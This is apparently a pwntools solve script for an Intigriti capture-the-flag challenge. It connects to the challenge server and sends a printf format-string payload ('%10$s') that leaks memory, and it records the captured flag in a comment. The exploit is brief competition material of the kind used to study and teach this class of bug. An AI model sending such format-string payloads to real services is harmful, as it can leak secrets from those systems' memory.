from pwn import *



p =remote("floormats.ctf.intigriti.io",1337) 

p.sendline(b'6')

p.sendline(b'%10$s')

p.interactive()

# INTIGRITI{50_7h475_why_7h3y_w4rn_4b0u7_pr1n7f}